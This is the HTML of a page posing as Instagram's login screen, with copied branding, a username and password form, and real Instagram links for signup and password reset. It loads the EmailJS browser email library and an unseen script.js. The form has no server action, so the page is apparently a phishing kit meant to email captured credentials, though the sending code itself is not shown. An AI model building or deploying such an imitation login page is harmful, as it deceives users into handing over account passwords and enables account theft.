<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <meta charset="UTF-8" />
  <title>Instagram Login Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css" />
<script src="script.js"></script>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="top">
      <div class="logo">
        <img src="instagram.png" alt="instagram" style="width: 175px;" />
      </div>

      <!-- Login Form -->
      <form id="login-form" class="form">
        <div class="input_field">
          <input
            type="text"
            id="username"
            placeholder="Phone number, username, or email"
            class="input"
            required
          />
        </div>
        <div class="input_field">
          <input
            type="password"
            id="password"
            placeholder="Password"
            class="input"
            required
          />
        </div>
        <div class="btn">
          <button type="submit">Log In</button>
        </div>
      </form>

      <div class="or">
        <div class="line"></div>
        <p>OR</p>
        <div class="line"></div>
      </div>

      <div class="dif">
        <div class="fb">
          <img src="facebook.png" alt="facebook" />
          <p>Log in with Facebook</p>
        </div>
        <div class="forgot">
          <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>
      </div>
    </div>

    <div class="signup">
      <p>
        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
      </p>
    </div>

    <div class="apps">
      <p>Get the app.</p>
      <div class="icons">
        <a href="#"><img src="appstore.png" alt="appstore" /></a>
        <a href="#"><img src="googleplay.png" alt="googleplay" /></a>
      </div>
    </div>
  </div>

  <div class="footer">
    <div class="links">
      <ul>
        <li><a href="#">ABOUT US</a></li>
        <li><a href="#">SUPPORT</a></li>
        <li><a href="#">PRESS</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">JOBS</a></li>
        <li><a href="#">PRIVACY</a></li>
        <li><a href="#">TERMS</a></li>
        <li><a href="#">DIRECTORY</a></li>
        <li><a href="#">PROFILES</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">LANGUAGE</a></li>
      </ul>
    </div>
    <div class="copyright">Â© 2025 INSTAGRAM</div>
  </div>
</div>

</body>
</html>
